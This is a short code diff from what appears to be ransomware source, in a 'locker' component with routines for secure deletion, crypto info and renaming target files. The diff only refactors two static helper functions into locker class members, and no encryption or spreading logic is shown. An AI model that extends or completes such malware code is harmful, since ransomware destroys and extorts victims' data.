@@ -3,6 +3,7 @@
 #include "memory.h"
 #include "logs.h"
 
+
 #include <stdio.h>
 #include <cstdint>
 #include <string>
@@ -451,7 +452,7 @@ static bool SecureDelete(CONST CHAR* FilePath)
 #endif
 
 
-static bool SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo)
+bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo)
 {
 	FileInfo->Filename = data->Filename;
 	if((FileInfo->newFilename = filesystem::NameMethodState(CryptInfo, data)) == NULL)
@@ -488,7 +489,7 @@ static bool SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO*
 	return true;
 }
 
-static void free_file_info(PFILE_INFO FileInfo, bool success)
+void locker::free_file_info(PFILE_INFO FileInfo, bool success)
 {
 	if (FileInfo->FileHandle != INVALID_HANDLE_VALUE)
 		api::CloseDesc(FileInfo->FileHandle);
